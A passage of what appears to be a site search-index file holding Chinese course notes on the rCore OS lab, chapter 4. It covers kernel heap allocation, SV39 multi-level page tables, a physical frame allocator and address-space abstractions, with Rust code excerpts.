<p>\u5728\u672c\u7ae0\u4e2d\uff0c\u6211\u4eec\u4f1a\u6b63\u5f0f\u533a\u5206\u5730\u5740Address\u548c\u5185\u5b58\u4f4d\u7f6eMemory Location\uff0c\u5b9e\u73b0</p> <ul> <li>\u5730\u5740\u8f6c\u6362</li> <li>\u6309\u9700\u5206\u914d\u9875</li> <li>\u9875\u9762\u66ff\u6362\u7b97\u6cd5</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#41","title":"4.1 \u5728\u5185\u6838\u4e2d\u5b9e\u73b0\u52a8\u6001\u5185\u5b58\u5206\u914d","text":"<p>\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u539f\u7406\u5c31\u5728\u4e8e\u8981\u5904\u7406\u90a3\u4e9b\u5728\u8fd0\u884c\u65f6\u624d\u77e5\u6653\u6240\u5360\u5b58\u50a8\u7a7a\u95f4\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u65f6\u5e38\u4f1a\u63d0\u5230\u52a8\u6001\u5185\u5b58\u5206\u914d\u4f1a\u9047\u5230\u5185\u5b58\u788e\u7247\uff0c\u5176\u4e00\u822c\u662f\u6307</p> <ul> <li>\u5185\u788e\u7247\uff0c\u5206\u914d\u51fa\u53bb\u4e0d\u4f7f\u7528\u7684\u7a7a\u95f4</li> <li>\u5916\u788e\u7247\uff0c\u672a\u5206\u914d\u51fa\u53bb\uff0c\u4f46\u662f\u592a\u5c0f\u4e86\u65e0\u6cd5\u4f7f\u7528\u7684</li> </ul> <p>Rust \u4e2d\u7684\u6307\u9488</p> <ul> <li>\u88f8\u6307\u9488 <code>*mut T</code>\u200b \u548c <code>*const T</code>\u200b \u4e0eC/C++\u4e2d\u7684\u6307\u9488\u4e00\u6837\uff0c\u4f46\u662f\u5728Rust\u4e2d\u4e0d\u80fd\u968f\u610f\u89e3\u5f15\u7528</li> <li>\u5f15\u7528 <code>&amp;mut T</code>\u200b\u548c<code>&amp;const T</code>\u200b \u4f1a\u505a\u6240\u6709\u6743\u68c0\u67e5</li> <li>\u667a\u80fd\u6307\u9488 \u5305\u542b\u66f4\u591a\u4fe1\u606f\u7684\u6307\u9488\uff0c\u5305\u62ec<code>Box</code>\u200b\uff0c<code>Rc</code>\u200b <code>Arc</code>\u200b\u7b49\u7b49  Rc\u53ef\u4ee5\u6709\u591a\u6240\u6709\u6743\uff1bRefCell\u53ef\u4ee5\u4fee\u6539\u5185\u90e8\u7684\u53d8\u91cf</li> </ul> <p>\u56e0\u4e3aallocator\u7684\u5b9e\u73b0\u8fc7\u4e8e\u590d\u6742\uff0c\u8fd9\u91cc\u5b9e\u9645\u4e0a\u662f\u5bfc\u5165\u4e86\u4e00\u4e2a\u5916\u90e8\u7684allocator\uff0c\u5e76\u4e14\u5c06\u5176\u521d\u59cb\u5316\u4e3a\u4e00\u4e2a\u5168\u5c40\u7684\u53d8\u91cf</p> <pre><code>#[global_allocator]\nstatic HEAP_ALLOCATOR: LockedHeap = LockedHeap::empty();\n\nstatic mut HEAP_SPACE: [u8; KERNEL_HEAP_SIZE] = [0; KERNEL_HEAP_SIZE];\n\npub fn init_heap() {\n    unsafe {\n        HEAP_ALLOCATOR\n            .lock()\n            .init(HEAP_SPACE.as_ptr() as usize, KERNEL_HEAP_SIZE);\n    }\n}\n</code></pre> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#42","title":"4.2 \u5730\u5740\u7a7a\u95f4","text":"<p>\u6211\u4eec\u5f80\u5f80\u628a\u5730\u5740\u7a7a\u95f4\u89c6\u4e3a\u4e00\u4e2a\u5de8\u5927\u7684\u6570\u7ec4\uff0c\u4f46\u662f\u5176\u5185\u90e8\u6709\u66f4\u591a\u7684\u8fed\u4ee3</p> <p>\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u89c6\u89d2\u4e2d\uff0c\u5730\u5740\u7a7a\u95f4\u662f\u4e00\u7247\u5de8\u5927\u7684\u7a7a\u95f4\uff0c\u5185\u90e8\u6709\u4e00\u5757\u8fde\u7eed\u7684\u7a7a\u95f4\u662f\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u8bbf\u95ee\uff0c\u867d\u7136\u5730\u5740\u7a7a\u95f4\u7531\u64cd\u4f5c\u7cfb\u7edf\u638c\u63e1\uff0c\u4f46\u662f\u865a\u5b9e\u5730\u5740\u7684\u8f6c\u6362\u7531\u786c\u4ef6\u673a\u5236\u5904\u7406\uff0c\u4e5f\u5c31\u662fMMU\u548cTLB\uff0c\u4e4b\u6240\u4ee5\u628a\u8fd9\u4e2a\u529f\u80fd\u4e0b\u653e\u5230\u786c\u4ef6\u673a\u5236\u662f\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387</p> <p>MMU\u673a\u5236\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u800c\u8a00\uff0c\u6620\u5c04\u673a\u5236\u662f\u4e0d\u540c\u7684\uff0c\u6bd4\u5982\u4e0d\u540c\u5e94\u7528\u7a0b\u5e8f\u76f8\u540c\u7684\u865a\u62df\u5730\u5740\u4f1a\u6620\u5c04\u5230\u4e0d\u540c\u7684\u7269\u7406\u5730\u5740\u4e0a\uff0c\u5f88\u663e\u7136\uff0c\u8fd9\u79cd\u9488\u5bf9\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7ed9\u4e88\u4e0d\u540c\u6620\u5c04\u8bbe\u8ba1\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u6765\u7ef4\u62a4\uff0c\u7531\u6b64\u4ea7\u751f\u4e86\u4e00\u7cfb\u5217\u673a\u5236</p> <ul> <li>\u5206\u6bb5\u5185\u5b58\u7ba1\u7406\uff1a\u662f\u6bd4\u8f83\u539f\u59cb\u7684\u7ba1\u7406\u6a21\u5f0f\uff0c\u7ed9\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5206\u914d\u56fa\u5b9a\u5927\u5c0f\u7684\u7a7a\u95f4\uff0c\u4e00\u4e2a\u4e2a\u6392\u5728\u5185\u5b58\u4e0a\uff0c\u5b9e\u73b0\u7b80\u5355\u4f46\u662f\u6d6a\u8d39\u5de8\u5927</li> <li>\u5206\u9875\u5185\u5b58\u7ba1\u7406\uff1a\u662f\u73b0\u4ee3\u7684\u7ba1\u7406\u6a21\u5f0f\uff0c\u5e94\u7528\u7684\u5730\u5740\u7a7a\u95f4\u548c\u7269\u7406\u5730\u5740\u7a7a\u95f4\u90fd\u88ab\u5206\u6210\u76f8\u540c\u5927\u5c0f\u7684frame\uff0c\u6211\u4eec\u4f1a\u7ed9\u865a\u62df\u9875\u5e27\u548c\u7269\u7406\u9875\u5e27\u4e00\u4e2a\u7f16\u53f7\uff0c\u79f0\u4e4b\u4e3aVPN\u548cPPN\uff0c\u5e76\u4e14\u4e3a\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6784\u5efa\u4e00\u4e2aPage Table \u9875\u8868\uff0c\u6765\u7ef4\u62a4VPN\u548cPPN\u7684\u6620\u5c04\u5173\u7cfb\u4ee5\u53ca\u8bbf\u95ee\u5c5e\u6027\uff0c\u6bd4\u5982\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c   \u200b\u200b</li> </ul> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#43-sv39","title":"4.3 SV39\u57fa\u7840\u4e0a\u7684\u591a\u7ea7\u9875\u8868","text":"<p>\u5206\u9875\u7684\u5185\u5b58\u7ba1\u7406\u662f\u4e00\u4e2a\u7ecf\u5178\u7684\u9700\u8981\u8f6f\u786c\u4ef6\u534f\u4f5c\u7684\u673a\u5236\uff0c\u800cRiscv 64\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86SV39\u7684\u786c\u4ef6\u5206\u9875\u673a\u5236</p> <p>\u5728\u4e4b\u524d\u6211\u4eec\u4f7f\u7528\u7684\u6307\u4ee4\u90fd\u662f\u76f4\u63a5\u64cd\u4f5c\u7684\u7269\u7406\u5730\u5740\uff0c\u663e\u7136\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5f00\u5173\u53bb\u542f\u7528MMU\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u8f6c\u6362\u865a\u5b9e\u5730\u5740\u7684\u673a\u5236\uff0c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e<code>stap</code>\u200b\u5bc4\u5b58\u5668\u53bb\u542f\u7528MMU\uff0c\u968f\u540e\u6240\u6709 S/U \u6743\u9650\u7684\u6307\u4ee4\u90fd\u4f1a\u89c6\u4e3a\u4e00\u4e2a39\u4f4d\u865a\u62df\u5730\u5740\u7684\u8bbf\u95ee</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u7684\u5206\u9875\u673a\u5236\u5c06\u6bcf\u4e2a\u9875\u8bbe\u8ba1\u4e3a4Kib\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u9700\u898112\u4f4d\u7684page offset\uff0c\u56e0\u6b64\u6211\u4eec\u5b9e\u9645\u9700\u8981\u4f7f\u7528\u865a\u62df\u5730\u5740\u7684\u9ad827\u4f4d\u4f5c\u4e3aVPN\u8f6c\u6362\u621044\u4f4d\u7684PPN</p> <p>\u200b\u200b</p> <p>\u4e0e\u5730\u5740\u76f8\u5173\u7684\u529f\u80fd\u5b9e\u73b0\u5728<code>address.rs</code>\u200b\u4e2d\uff0c\u6211\u4eec\u5c01\u88c5\u4e86\u56db\u4e2a\u5143\u7ec4\u7ed3\u6784\u4f53\uff0c\u7b80\u5355\u5730\u5c06<code>usize</code>\u200b\u5c01\u88c5\u8d77\u6765</p> <pre><code>/// Definitions\n#[derive(Copy, Clone, Ord, PartialOrd, Eq, PartialEq)]\npub struct PhysAddr(pub usize);\n\n/// virtual address\n#[derive(Copy, Clone, Ord, PartialOrd, Eq, PartialEq)]\npub struct VirtAddr(pub usize);\n\n/// physical page number\n#[derive(Copy, Clone, Ord, PartialOrd, Eq, PartialEq)]\npub struct PhysPageNum(pub usize);\n\n/// virtual page number\n#[derive(Copy, Clone, Ord, PartialOrd, Eq, PartialEq)]\npub struct VirtPageNum(pub usize);\n</code></pre> <ul> <li>\u5728rust\u4e2d\uff0c\u5143\u7ec4\u4e2d\u7684<code>pub</code>\u200b\u4f7f\u5f97\u8be5\u5143\u7d20\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\uff0c\u5f62\u5982<code>x.0</code>\u200b\u6765\u8bbf\u95ee\u7b2c\u4e00\u4e2a\u5143\u7d20</li> </ul> <p>\u540c\u65f6\uff0c\u6211\u4eec\u4e3a\u4e86\u4fdd\u6301\u7c7b\u578b\u5b89\u5168\uff0c\u4f7f\u7528rust\u4e2d\u7684 <code>From trait</code>\u200b \u5728\u56db\u79cd\u7c7b\u578b\u548c<code>usize</code>\u200b\u4e4b\u95f4\u505a\u4e86\u8f6c\u6362\u5de5\u4f5c\uff0c\u540c\u65f6\u6211\u4eec\u8fd8\u80fd\u4ece\u7269\u7406\u5730\u5740\u63d0\u53d6\u7269\u7406\u9875\u53f7\uff0c\u865a\u62df\u5730\u5740\u63d0\u53d6\u865a\u62df\u9875\u53f7\uff0c\u8fd9\u4e00\u5207\u90fd\u901a\u8fc7\u4f4d\u8fd0\u7b97\u5b8c\u6210\uff0c\u8fd9\u90e8\u5206\u8f6c\u6362\u5de5\u4f5c\u82b1\u8d39\u4e86\u5927\u91cf\u7684\u4ee3\u7801\uff0c\u4f46\u662f\u53ef\u4ee5\u6709\u6548\u4fdd\u8bc1\u8fd0\u7b97\u65f6\u7684\u51c6\u786e\u6027\u3002</p> <p>\u5728SV39\u673a\u5236\u4e2d\uff0c\u865a\u62df\u9875\u53f7\u80fd\u591f\u67e5\u8be2\u5230\u7684\u4e0d\u662f\u7269\u7406\u5730\u5740\uff0c\u800c\u662f\u4e00\u4e2a\u9875\u8868\u9879PTE\uff0c\u5f62\u5f0f\u5982\u4e0b\uff0c\u4e0d\u4ec5\u5305\u542b\u4e86PPN\uff0c\u8fd8\u5305\u542b\u4e86\u8be5\u9875\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u4f8b\u5982\u5730\u5740\u662f\u5426\u5408\u6cd5\uff0c\u662f\u5426\u53ef\u8bfb\u53ef\u5199\u7b49\u7b49</p> <p>\u200b\u200b</p> <p>\u4e3a\u4e86\u66f4\u597d\u5730\u5904\u7406[7:0]\u8fd9\u51e0\u4e2abit\uff0c\u6211\u4eec\u4f7f\u7528rust\u5e93\u4e2d\u63d0\u4f9b\u7684\u4e00\u4e2a\u5b8f\uff0c\u6211\u4eec\u540e\u7eed\u53ea\u9700\u8981\u628aPTE\u548cPTEflags\u4e2d\u7684\u6210\u5458\u8fdb\u884c\u6309\u4f4d\u4e0e\uff08&amp;\uff09\uff0c\u5373\u53ef\u5224\u65ad\u8be5\u4f4d\u662f\u5426\u4e3a1</p> <pre><code>// os/src/mm/page_table.rs\n\nuse bitflags::*;\n\nbitflags! {\n    pub struct PTEFlags: u8 {\n        const V = 1 &lt;&lt; 0;\n        const R = 1 &lt;&lt; 1;\n        const W = 1 &lt;&lt; 2;\n        const X = 1 &lt;&lt; 3;\n        const U = 1 &lt;&lt; 4;\n        const G = 1 &lt;&lt; 5;\n        const A = 1 &lt;&lt; 6;\n        const D = 1 &lt;&lt; 7;\n    }\n}\n</code></pre> <p>\u6709\u4e86\u4e0a\u8ff0\u51e0\u4e2a\u7c7b\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0PTE\u7c7b\u4e86\uff0c\u8be5\u7c7b\u5b9e\u73b0\u5728<code>page_table.rs</code>\u200b\u4e2d\uff0c\u5e76\u4e14\u5b9e\u73b0\u4e00\u7cfb\u5217\u7684\u8f85\u52a9\u529f\u80fd</p> <pre><code>#[derive(Copy, Clone)]  //\u53ea\u662f\u5bf9\u4e8eusize\u7684\u7b80\u5355\u5c01\u88c5\uff0c\u4e0d\u9700\u8981\u505a\u79fb\u52a8\u8bed\u4e49\n#[repr(C)]              //\u8fd9\u4e2a\u4e1c\u897f\u662f\u544a\u8bc9\u7f16\u8bd1\u5668\uff0c\u6211\u4eec\u8fd9\u91cc\u5b9a\u4e49\u7684\u7ed3\u6784\u4f53\u7684\u5185\u5b58\u5206\u5e03\u9700\u8981\u548cC\u8bed\u8a00\u7684\u4e00\u81f4\uff0c\u8fd9\u5728\u6211\u4eec\u9700\u8981\u548cC\u8bed\u8a00\u534f\u4f5c\u5f00\u53d1\u7684\u65f6\u5019\u5f88\u91cd\u8981\npub struct PageTableEntry {\n    pub bits: usize,\n}\n\nimpl PageTableEntry {\n    pub fn new(ppn: PhysPageNum, flags: PTEFlags) -&gt; Self {\n        PageTableEntry {\n            bits: ppn.0 &lt;&lt; 10 | flags.bits as usize,\n        }\n    }\n    ...\n    pub fn is_valid(&amp;self) -&gt; bool {\n        (self.flags() &amp; PTEFlags::V) != PTEFlags::empty()\n    }\n}\n</code></pre> <p>\u591a\u7ea7\u9875\u8868\u7684\u5b9e\u73b0</p> <p>\u4e3a\u4e86\u63d0\u9ad8\u7a7a\u95f4\u7684\u5229\u7528\u7387\uff0c\u6211\u4eec\u662f\u5e0c\u671b\u80fd\u591f\u6309\u9700\u5206\u914d\u9875\u8868\u7684\u5b58\u50a8\uff0c\u6709\u591a\u5c11\u5408\u6cd5VPN\u5c31\u6709\u591a\u5c11\u4e2a\u9875\u8868\u9879\u5b58\u7740\u3002\u8fd9\u5c31\u7c7b\u4f3c\u4e8e\u6570\u636e\u7ed3\u6784\u4e2d\u7684\u5b57\u5178\u6811\uff0c\u672c\u8eab\u662f\u4e00\u9897\u7a7a\u6811\uff0c\u5f53\u6709\u5355\u8bcd\u63d2\u5165\u7684\u65f6\u5019\u624d\u751f\u6210\u8282\u70b9\u3002\u800c\u591a\u7ea7\u9875\u8868\u7684\u5b9e\u73b0\u6b63\u597d\u7c7b\u4f3c</p> <p>27\u4f4d\u7684\u865a\u62df\u9875\u53f7\uff0c\u6211\u4eec\u5c06\u5176\u89c6\u4e3a3\u4f4d\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e00\u4f4d\u7684\u5b57\u7b26\u96c6\u5408\u662f0~511\uff0c\u4e5f\u5c31\u662f\\(2^9\\)\uff0c\u8fd9\u6837 \\(3\\times9=27\\)\uff0c\u4e00\u5171\u4e09\u5c42\uff0c\u6bcf\u5c42\u6700\u591a512\u5206\u53c9</p> <p>\u8fd9\u6837\u8bbe\u8ba1\u8fd8\u6709\u4e00\u4e2a\u7279\u70b9\u5c31\u662f\u53f6\u5b50\u8282\u70b9\uff0c\u6709512\u5206\u53c9\uff0c\u6bcf\u4e2a\u5206\u53c9\u7684PTE\u662f64\u4f4d\u4e5f\u53738\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e00\u4e2a\u53f6\u5b50\u9636\u6bb5\u53604Kb\uff0c\u6b63\u597d\u662f\u6211\u4eec\u4e4b\u524d\u5212\u5206\u4e00\u4e2aframe\u7684\u5927\u5c0f\uff0c\u5bf9\u4e8eFlags\uff0c\u6211\u4eec\u505a\u5982\u4e0b\u8bbe\u7f6e</p> <ul> <li>\u5f53 <code>V</code>\u200b \u4e3a 0 \u7684\u65f6\u5019\uff0c\u4ee3\u8868\u5f53\u524d\u6307\u9488\u662f\u4e00\u4e2a\u7a7a\u6307\u9488\uff0c\u65e0\u6cd5\u8d70\u5411\u4e0b\u4e00\u7ea7\u8282\u70b9\uff0c\u5373\u8be5\u9875\u8868\u9879\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u8303\u56f4\u662f\u65e0\u6548\u7684\uff1b</li> <li>\u53ea\u6709\u5f53 <code>V</code>\u200b \u4e3a1 \u4e14 <code>R/W/X</code>\u200b \u5747\u4e3a 0 \u65f6\uff0c\u8868\u793a\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u9875\u76ee\u5f55\u8868\u9879\uff0c\u5176\u5305\u542b\u7684\u6307\u9488\u4f1a\u6307\u5411\u4e0b\u4e00\u7ea7\u7684\u9875\u8868\uff1b</li> <li>\u6ce8\u610f: \u5f53 <code>V</code>\u200b \u4e3a1 \u4e14 <code>R/W/X</code>\u200b \u4e0d\u5168\u4e3a 0 \u65f6\uff0c\u8868\u793a\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u9875\u8868\u9879\uff0c\u5176\u5305\u542b\u4e86\u865a\u5730\u5740\u5bf9\u5e94\u7684\u7269\u7406\u9875\u53f7\u3002</li> </ul> <p>\u200b\u200b</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u9875\u8868\uff0c\u6211\u4eec\u5728\u4f7f\u7528\u4e4b\u524d\u9700\u8981\u628a\u6839\u9875\uff08\u4e00\u7ea7\u9875\u8868\uff09\u7684\u7269\u7406\u9875\u53f7\u653e\u5230<code>satp</code>\u200b\u5bc4\u5b58\u5668\u4e0a</p> <p>\u6211\u4eec\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fdb\u884c\u786c\u7f16\u7801\uff0c\u786e\u5b9a\u597d\u54ea\u4e00\u90e8\u5206\u5185\u5b58\u662f\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u4ee3\u7801\u7684\uff0c\u54ea\u4e00\u90e8\u5206\u5185\u5b58\u662f\u53ef\u4ee5\u88ab\u9875\u8868\u8fdb\u884c\u7ba1\u7406\u5206\u914d\u7684\u7269\u7406\u9875\u5e27\u3002</p> <p>\u6211\u4eec\u8bbe\u8ba1\u4e00\u4e2a<code>trait</code>\u200b\u4f5c\u4e3a\u7269\u7406\u9875\u5e27\u5206\u914d\u5668\u7684\u63a5\u53e3</p> <pre><code>trait FrameAllocator {\n    fn new() -&gt; Self;\n    fn alloc(&amp;mut self) -&gt; Option&lt;PhysPageNum&gt;;\n    fn dealloc(&amp;mut self, ppn: PhysPageNum);\n}\n</code></pre> <p>\u7269\u7406\u9875\u5e27\u7684\u5206\u914d\uff0c\u5b9e\u9645\u5c31\u662f\u7ba1\u7406\u7269\u7406\u9875\u53f7\u7684\u5206\u914d\u548c\u56de\u6536\uff0c\u6211\u4eec\u6765\u5b9e\u73b0\u4e00\u4e2a\u6808\u5f0f\u7684\u5206\u914d\u5668</p> <pre><code>pub struct StackFrameAllocator {\n    current: usize,  //\u7a7a\u95f2\u5185\u5b58\u7684\u8d77\u59cb\u7269\u7406\u9875\u53f7\n    end: usize,      //\u7a7a\u95f2\u5185\u5b58\u7684\u7ed3\u675f\u7269\u7406\u9875\u53f7\n    recycled: Vec&lt;usize&gt;,\n}\n\nimpl StackFrameAllocator {\n    pub fn init(&amp;mut self, l: PhysPageNum, r: PhysPageNum) {\n        self.current = l.0;\n        self.end = r.0;\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u7684<code>recycled</code>\u200b\u5c31\u662f\u8868\u793a\u5206\u914d\u7136\u540e\u53c8\u56de\u6536\u7684\u9875\u53f7\uff0c\u56e0\u6b64\u6211\u4eec\u5728<code>alloc</code>\u200b\u65f6\u5148\u53bb<code>recycled</code>\u200b\u4e2d\u627e\uff0c\u968f\u540e\u6211\u4eec\u5b9e\u73b0\u597dalloc\u548cdealloc\u65b9\u6cd5\uff0c\u5e76\u4e14\u521d\u59cb\u5316\u597d\u5168\u5c40\u7684<code>StackFrameAllocator</code>\u200b\uff0c\u4e4b\u540e\u521b\u5efaalloc\u548cdealloc\u7684\u516c\u5f00\u63a5\u53e3</p> <pre><code>pub fn frame_alloc() -&gt; Option&lt;FrameTracker&gt; {\n    FRAME_ALLOCATOR\n        .exclusive_access()\n        .alloc()\n        .map(|ppn| FrameTracker::new(ppn))\n}\n\nfn frame_dealloc(ppn: PhysPageNum) {\n    FRAME_ALLOCATOR\n        .exclusive_access()\n        .dealloc(ppn);\n}\n\nimpl Drop for FrameTracker {\n    fn drop(&amp;mut self) {\n        frame_dealloc(self.ppn);\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u7684<code>FrameTracker</code>\u200b\u662f\u5bf9\u7269\u7406\u9875\u53f7\u7684\u7b80\u5355\u5c01\u88c5\uff0c\u4f46\u662f\u8fd9\u91cc\u4f7f\u7528\u5230\u4e86RAII\u7684\u601d\u60f3\uff0c\u53ea\u8981\u4f7f\u7528<code>FrameTracker</code>\u200b\u5c31\u81ea\u52a8\u5b9e\u73b0\u5206\u914d\uff0c\u800c\u5f53\u6211\u4eec\u624b\u52a8\u6539\u5199<code>Drop</code>\u200b\u8fd9\u4e2a\u7279\u6027\u4e4b\u540e\uff0c<code>FrameTracker</code>\u200b\u7684\u751f\u547d\u5468\u671f\u7684\u7ed3\u675f\u4f9d\u65e7\u76f4\u63a5\u662f\u7684\u7269\u7406\u9875\u53f7\u88abdealloc\uff0c\u901a\u8fc7</p> <ul> <li>\u516c\u5f00\u63a5\u53e3</li> <li>Drop\u7279\u6027</li> </ul> <p>\u6211\u4eec\u5c31\u5b8c\u6210\u4e86RAII\u7684\u5c01\u88c5\uff0c\u5c06\u751f\u547d\u5468\u671f\u548c\u8d44\u6e90\u7ed1\u5b9a\u8d77\u6765\uff0c\u597d\u5904\u5c31\u662f\u6211\u4eec\u65e0\u9700\u624b\u52a8\u7ba1\u7406\u7269\u7406\u9875\u5e27\u7684\u56de\u6536\u4e86</p> <p>\u6709\u4e86\u7269\u7406\u9875\u7684\u5206\u914d\u5668\u4e4b\u540e\uff0c\u6211\u4eec\u6765\u6b63\u5f0f\u5f00\u59cb\u5b9e\u73b0\u591a\u7ea7\u9875\u8868</p> <pre><code>// os/src/mm/page_table.rs\n\npub struct PageTable {\n    root_ppn: PhysPageNum,\n    frames: Vec&lt;FrameTracker&gt;,\n}\n\nimpl PageTable {\n    pub fn new() -&gt; Self {\n        let frame = frame_alloc().unwrap();\n        PageTable {\n            root_ppn: frame.ppn,\n            frames: vec![frame],\n        }\n    }\n}\n</code></pre> <p>\u5bf9\u4e8e\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u800c\u8a00\uff0c\u5b83\u4eec\u6709\u81ea\u5df1\u7684\u9875\u8868\uff0c\u56e0\u6b64<code>PageTable</code>\u200b\u5bf9\u8c61\u9700\u8981\u5b58\u50a8root\u7684PPN\uff0c\u7528\u4ee5\u533a\u5206\u5404\u4e2a\u9875\u8868\uff0c\u800c\u5bf9\u591a\u7ea7\u9875\u8868\u800c\u8a00\uff0c\u6700\u91cd\u8981\u7684\u65e0\u7591\u662f\u5176\u9700\u8981\u63d2\u5165\u548c\u5220\u9664VPN/PPN\u5bf9\uff0c\u5b9e\u73b0\u4e86\u8be5\u529f\u80fd\u4e4b\u540e\uff0c\u7cfb\u7edf\u542f\u7528\u5206\u9875\u673a\u5236\uff0c\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u90fd\u53ea\u80fd\u6267\u884c\u5728\u865a\u62df\u5730\u5740\u4e0a\u4e86</p> <p>\u603b\u7ed3\u4e00\u4e0b\u9875\u8868\u8bbe\u8ba1\u7684\u51e0\u4e2a\u6a21\u5757</p> <ul> <li>\u865a\u5b9e\u5730\u5740\uff0c\u865a\u5b9e\u9875\u53f7\uff0c\u4e00\u5171\u56db\u4e2a\u5c01\u88c5\u597d\u7684\u5143\u7ec4\uff0c\u5b9e\u73b0\u4e8e<code>address.rs</code>\u200b</li> <li>\u7269\u7406\u9875\u53f7\u5206\u914d\u5668\uff0c\u4ec5\u7ba1\u7406\u9875\u53f7\u7684\u5206\u53d1\uff0c\u5b9e\u73b0\u4e8e <code>frame_allocator.rs</code>\u200b</li> <li>\u9875\u8868\u7684\u5b9e\u73b0\uff0c\u4e3b\u8981\u662f\u7ba1\u7406\u63d2\u5165\u548c\u5220\u9664\uff0c\u5b9e\u73b0\u4e8e<code>page_table.rs</code>\u200b</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#44","title":"4.4 \u5185\u6838\u548c\u5e94\u7528\u7684\u5730\u5740\u7a7a\u95f4","text":"<p>\u672c\u7ae0\u7684\u4ee3\u7801\u4fa7\u91cd\u4e8e<code>memory_set.rs</code>\u200b\uff0c\u672c\u7ae0\u7684\u76ee\u6807\u5728\u4e8e\u5b8c\u6210\u5730\u5740\u7a7a\u95f4\u7684\u62bd\u8c61\u3002</p> <p>\u9996\u5148\u5bf9\u4e8e\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u800c\u8a00\uff0c\u5176\u6240\u770b\u5230\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u662f\u8fde\u7eed\uff0c\u56e0\u6b64\u6211\u4eec\u6709\u4e00\u6bb5\u8fde\u7eed\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u9996\u5148\u6211\u4eec\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7ed3\u6784\u8868\u793a\u4e00\u6bb5\u8fde\u7eed\u7684\u865a\u62df\u9875\u53f7</p> <pre><code>impl&lt;T&gt; SimpleRange&lt;T&gt;\nwhere\n    T: StepByOne + Copy + PartialEq + PartialOrd + Debug,\n{\n    pub fn new(start: T, end: T) -&gt; Self {\n        assert!(start &lt;= end, \"start {:?} &gt; end {:?}!\", start, end);\n        Self { l: start, r: end }\n    }\n    pub fn get_start(&amp;self) -&gt; T {\n        self.l\n    }\n    pub fn get_end(&amp;self) -&gt; T {\n        self.r\n    }\n}\n\npub type VPNRange = SimpleRange&lt;VirtPageNum&gt;;\n</code></pre> <p>\u501f\u6b64\u6211\u4eec\u5f62\u6210\u4e00\u4e2a\u5730\u5740\u533a\u57df\u7684\u6570\u636e\u7c7b\u578b</p> <pre><code>pub struct MapArea {\n    vpn_range: VPNRange,\n    data_frames: BTreeMap&lt;VirtPageNum, FrameTracker&gt;,\n    map_type: MapType,\n    map_perm: MapPermission,\n}\n</code></pre> <p>\u9664\u4e86\u6620\u5c04\u548c\u9875\u53f7\u8303\u56f4\u4e4b\u5916\uff0c\u8fd8\u6709MapType\u548cMapPermission\u4e24\u4e2a\u8f85\u52a9\u6570\u636e\u7528\u4e8e\u63cf\u8ff0\u8fd9\u4e2aMapArea</p> <p>\u8fd9\u91cc\u7684MapPermission\u6bd4\u8f83\u597d\u7406\u89e3\uff0c\u5c31\u662f\u4e00\u4e9b\u5bf9\u4e8e\u8fd9\u5757\u5730\u5740\u7a7a\u95f4\u7684\u53ef\u8bfb\u53ef\u5199\u6027\u8d28\u7684\u63cf\u8ff0\uff0c\u800cMapType\u4e00\u5171\u6709\u4e24\u79cd</p> <ul> <li>Identical 